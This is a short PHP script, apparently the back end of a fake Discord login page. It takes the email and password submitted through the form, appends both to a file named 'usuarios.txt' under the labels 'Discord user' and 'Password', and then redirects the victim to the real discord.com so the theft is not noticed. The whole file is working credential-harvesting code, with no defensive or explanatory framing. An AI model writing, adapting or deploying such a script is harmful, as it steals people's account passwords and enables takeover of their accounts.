<?php 
file_put_contents("usuarios.txt", "  [~] Discord user: " . $_POST['email'] . "\n  [~] Password: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com');
exit();
?>